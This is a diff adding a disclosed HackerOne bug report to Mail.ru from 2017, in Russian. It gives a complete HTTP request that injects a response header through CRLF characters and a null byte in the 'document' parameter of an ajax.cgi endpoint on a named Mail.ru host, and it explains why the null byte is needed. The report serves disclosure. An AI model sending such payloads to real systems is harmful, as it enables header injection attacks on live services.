@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/99268
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/bigbear_
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:03.03.2017 13:15:11
+
+Summary:
+
+Давно не попадались на ваших серверах.
+
+Пример запроса:
+
+GET /brat/ajax.cgi?action=downloadFile&collection=/&detailed=True&dir=True&extension=xml&filters=content::content_reference::omission::distortion::nonsense::inexact::unclear::content_cohesion::ThemeRheme::logic::content_pragmatics::register::use::&protocol=1&document=%0d%0aCRLF_Vulnerabled:true%00 HTTP/1.1
+Host: otus.p.mail.ru
+
+Если не использовать нулл-байт в переменной document, то инжектируемый хэдэр пример вид true.xml
+
+Поэтому для корректного инжекта необходим такой суффикс в виду нулл-байта.
